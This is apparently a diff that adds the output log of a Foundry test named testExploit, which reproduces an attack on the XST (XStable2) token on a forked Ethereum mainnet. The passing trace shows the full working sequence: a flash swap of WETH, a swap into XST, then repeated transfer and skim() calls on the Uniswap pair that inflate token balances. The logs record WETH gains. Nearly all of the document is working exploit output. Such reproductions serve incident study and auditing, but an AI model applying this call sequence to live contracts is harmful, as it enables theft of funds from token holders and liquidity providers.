@@ -1,0 +1,714 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/XST_exp.sol:XSTExpTest
+[PASS] testExploit() (gas: 959148)
+Logs:
+  Reserve amount 605494314011911
+  Swap xst 403662876007940
+  My xst balance: 751683432857598, uniswp xst: 375841716428802
+  my weth balance: 105290709049849600449
+  Refund 78305090285962221370:
+  now my weth num: 26
+
+Traces:
+  [3644] XSTExpTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 15310016 [1.531e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [1054948] XSTExpTest::testExploit()
+    ├─ [2534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   └─ ← [Return] 38996558907351703870 [3.899e19]
+    ├─ [1033219] 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852::swap(77993117814703407740 [7.799e19], 0, XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x30303030)
+    │   ├─ [29962] WETH9::transfer(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 77993117814703407740 [7.799e19])
+    │   │   ├─ emit Transfer(from: 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852, to: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 77993117814703407740 [7.799e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000043a5f376d5e96427c
+    │   │   │   @ 0xaced72359d8708e95d2112ba70e71fa267967a5588d15e7c78c1904e0debe410: 0x00000000000000000000000000000000000000000000021db25c9f76036abd59 → 0x00000000000000000000000000000000000000000000021977fd6808a4d47add
+    │   │   └─ ← [Return] true
+    │   ├─ [961326] XSTExpTest::uniswapV2Call(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 77993117814703407740 [7.799e19], 0, 0x30303030)
+    │   │   ├─ [534] WETH9::balanceOf(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 77993117814703407740 [7.799e19]
+    │   │   ├─ [6062] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 77993117814703407740 [7.799e19])
+    │   │   │   ├─ emit Transfer(from: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 77993117814703407740 [7.799e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6940: 0x0000000000000000000000000000000000000000000000021d2f9bb6af4b213e → 0x000000000000000000000000000000000000000000000006578ed3240de163ba
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000043a5f376d5e96427c → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   ├─ [2504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 605494314011911 [6.054e14], 38996558907351703870 [3.899e19], 1659872212 [1.659e9]
+    │   │   ├─ [0] console::log("Reserve amount %s", 605494314011911 [6.054e14]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Swap xst %s", 403662876007940 [4.036e14]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [159642] UniswapV2Pair::swap(403662876007940 [4.036e14], 0, XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x3030)
+    │   │   │   ├─ [120597] AdminUpgradeabilityProxy::fallback(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 403662876007940 [4.036e14])
+    │   │   │   │   ├─ [113318] XStable2::transfer(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 403662876007940 [4.036e14]) [delegatecall]
+    │   │   │   │   │   ├─ [2388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 605494314011911 [6.054e14]
+    │   │   │   │   │   │   └─ ← [Return] 605494314011911 [6.054e14]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 403662876007940 [4.036e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 80128090044766 [8.012e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 80128090044766 [8.012e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000000000000d351b4c8f9801 → 0x000000000000000000000000000000000000000000000000001898264a4e8eb5
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6945: 0x0000000000000000000000000000000000000000000000021ea9c13abb6742fc → 0x0000000000000000000000000000000000000000000000021d3843bf13742aa1
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6942: 0x0000000000000000000000000000000000000000000000021d3843bf13742aa1 → 0x000000000000000000000000000000000000000000000006578ed3240de163ba
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x0897bef2c12afb307f39ff0362d586f96e604d99602f97aecf3b6adfdb0a7f1e → 0x0df3ff6593b774cd6bd91818d707f52536913a2911a3cff8859d5223b2863540
+    │   │   │   │   │   │   @ 0x1a670d8dd5e8e6b20e2134ca2c3f077cc605eda824aae5201b15d148921a9532: 0x288187add54c806c4817f20f6d98ffedeaa45eb5b7bab0227983cd6446d59a80 → 0x0d80828f471993a27f33dde76289141767d34ae4cf265ee58480366992ef2784
+    │   │   │   │   │   │   @ 6: 0x0000000000000000000000000000000000000000000000000000000062efa3d4 → 0x0000000000000000000000000000000000000000000000000000000062f2bdbd
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x000000000000000000000000000000000000000000000000000226a8cbe42726 → 0x000000000000000000000000000000000000000000000000000226b1a1800d07
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6944: 0x00000000000000000000000000000000000000000000000000022530bc90f218 → 0x000000000000000000000000000000000000000000000000000226a8cbe42726
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x1b01051e8e32ecc9c8e414280b0febd682d113d0e894513cf50396fab3e672fc
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x0897bef2c12afb307f39ff0362d586f96e604d99602f97aecf3b6adfdb0a7f1e → 0x0df3ff6593b774cd6bd91818d707f52536913a2911a3cff8859d5223b2863540
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [1412] XSTExpTest::uniswapV2Call(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 403662876007940 [4.036e14], 0, 0x3030)
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 375841716428802 [3.758e14]
+    │   │   │   │   └─ ← [Return] 375841716428802 [3.758e14]
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ emit Sync(reserve0: 375841716428802 [3.758e14], reserve1: 116989676722055111610 [1.169e20])
+    │   │   │   ├─ emit Swap(sender: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 174010278424831 [1.74e14], amount1In: 77993117814703407740 [7.799e19], amount0Out: 403662876007940 [4.036e14], amount1Out: 0, to: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 9: 0x000000000000000000000000071f0dd17db4e98312622c59114596684a426866 → 0x00000000000000000000000007221a0578d6712bf6245eede33272feeb495919
+    │   │   │   │   @ 10: 0x000000000000000000000000000000000231dc0a3ad8593fe7e13097099e7749 → 0x00000000000000000000000000000000023503e5e5c733f780dfbc5d27b82676
+    │   │   │   │   @ 8: 0x62efa3d40000000000021d2f9bb6af4b213e000000000000000226b1a1800d07 → 0x62f2bdbd000000000006578ed3240de163ba000000000000000155d377ffe002
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [9777] UniswapV2Pair::sync()
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 375841716428802 [3.758e14]
+    │   │   │   │   └─ ← [Return] 375841716428802 [3.758e14]
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ emit Sync(reserve0: 375841716428802 [3.758e14], reserve1: 116989676722055111610 [1.169e20])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4725] AdminUpgradeabilityProxy::fallback(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [3949] XStable2::balanceOf(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 751683432857598 [7.516e14]
+    │   │   │   └─ ← [Return] 751683432857598 [7.516e14]
+    │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 375841716428802 [3.758e14]
+    │   │   │   └─ ← [Return] 375841716428802 [3.758e14]
+    │   │   ├─ [0] console::log("My xst balance: %s, uniswp xst: %s", 751683432857598 [7.516e14], 375841716428802 [3.758e14]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39113] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 93960429107199 [9.396e13])
+    │   │   │   ├─ [38334] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 93960429107199 [9.396e13]) [delegatecall]
+    │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 375841716428802 [3.758e14]
+    │   │   │   │   │   └─ ← [Return] 375841716428802 [3.758e14]
+    │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   ├─ emit Transfer(from: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 92551022670593 [9.255e13])
+    │   │   │   │   ├─ emit Transfer(from: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 939604291071 [9.396e11])
+    │   │   │   │   ├─ emit Transfer(from: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xDC958664Bc528A55723740b2F32F11CA8B601c83, value: 469802145535 [4.698e11])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x72df8701a157df1504c992cc381b2a2a15b3a6a12925db3f882ce3b1ee1fde0a: 0x00bd1862d26eca4722251cacc9eadd4a4b56e1e4c88d1b83a35e57442e8774f8 → 0x00c16a781f0061ecd3ab0e5541faf6431b2cf3173bc88e78fd02ae0f8e299626
+    │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x000000000000000000000000000000000000000000000000000226b1a1800d07 → 0x000000000000000000000000000000000000000000000000000155d377ffe002
+    │   │   │   │   │   @ 0x1a670d8dd5e8e6b20e2134ca2c3f077cc605eda824aae5201b15d148921a9532: 0x0d80828f471993a27f33dde76289141767d34ae4cf265ee58480366992ef2784 → 0x10d3acf3332b184bf855284c7e0c6f67a98d2ed761fd31df26d5e428a4d1ba56
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x1b01051e8e32ecc9c8e414280b0febd682d113d0e894513cf50396fab3e672fc → 0x17a0e47abc6c971295df6de64af5f7da14667260ae994012e3f0e649ae753fce
+    │   │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000000000001898264a4e8eb5 → 0x0000000000000000000000000000000000000000000000000018974b8586e0b6
+    │   │   │   │   │   @ 11: 0xf8b204fcf9a594f7e3acb342c98e01cdc78cb348eafec46ed3683537e65eec9d → 0xf8a960d260825b8fdb4f490e9d07821a6ab206fdb715f933be4f891152726d6f
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 468392739099395 [4.683e14]
+    │   │   │   │   └─ ← [Return] 468392739099395 [4.683e14]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 92551022670593 [9.255e13])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 92551022670593 [9.255e13]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 468392739099395 [4.683e14]
+    │   │   │   │   │   │   └─ ← [Return] 468392739099395 [4.683e14]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 92551022670593 [9.255e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 32339409719115 [3.233e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 32339409719115 [3.233e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x000000000000000000000000000000000000000000000000000155d377ffe002 → 0x0000000000000000000000000000000000000000000000000001aa002ed45303
+    │   │   │   │   │   │   @ 12: 0x0000000000000000000000000000000000000000000000000018974b8586e0b6 → 0x000000000000000000000000000000000000000000000000001d2fcbbeab4479
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x0df3ff6593b774cd6bd91818d707f52536913a2911a3cff8859d5223b2863540 → 0x0f1d69ff40723527a5e92b14668c8648e0a2ef8986571c9ab0b0b275ba52d4c6
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x0df3ff6593b774cd6bd91818d707f52536913a2911a3cff8859d5223b2863540 → 0x0f1d69ff40723527a5e92b14668c8648e0a2ef8986571c9ab0b0b275ba52d4c6
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 555928663215417 [5.559e14]
+    │   │   │   │   └─ ← [Return] 555928663215417 [5.559e14]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 180086946786615 [1.8e14])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 180086946786615 [1.8e14]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 555928663215417 [5.559e14]
+    │   │   │   │   │   │   └─ ← [Return] 555928663215417 [5.559e14]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 180086946786615 [1.8e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 43345127222070 [4.334e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 43345127222070 [4.334e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x0000000000000000000000000000000000000000000000000001aa002ed45303 → 0x0000000000000000000000000000000000000000000000000001f99d3a7dcd39
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x0f1d69ff40723527a5e92b14668c8648e0a2ef8986571c9ab0b0b275ba52d4c6 → 0x106d4754496c77b0bb76491c129ca6a1fbd88e96c99c976368edea3de16a8e64
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x0f1d69ff40723527a5e92b14668c8648e0a2ef8986571c9ab0b0b275ba52d4c6 → 0x106d4754496c77b0bb76491c129ca6a1fbd88e96c99c976368edea3de16a8e64
+    │   │   │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000000000001d2fcbbeab4479 → 0x000000000000000000000000000000000000000000000000002358aeb31a04f7
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 673254730705998 [6.732e14]
+    │   │   │   │   └─ ← [Return] 673254730705998 [6.732e14]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 297413014277196 [2.974e14])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 297413014277196 [2.974e14]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 673254730705998 [6.732e14]
+    │   │   │   │   │   │   └─ ← [Return] 673254730705998 [6.732e14]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 297413014277196 [2.974e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 46367432458350 [4.636e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 46367432458350 [4.636e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x106d4754496c77b0bb76491c129ca6a1fbd88e96c99c976368edea3de16a8e64 → 0x1195f35f5519f11c09b94c8768763c50f16825dac81ea301a79d64b717ee126c
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x106d4754496c77b0bb76491c129ca6a1fbd88e96c99c976368edea3de16a8e64 → 0x1195f35f5519f11c09b94c8768763c50f16825dac81ea301a79d64b717ee126c
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x0000000000000000000000000000000000000000000000000001f99d3a7dcd39 → 0x0000000000000000000000000000000000000000000000000002645255112c4e
+    │   │   │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000000000002358aeb31a04f7 → 0x0000000000000000000000000000000000000000000000000029ef8510bc163c
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 798761537551945 [7.987e14]
+    │   │   │   │   └─ ← [Return] 798761537551945 [7.987e14]
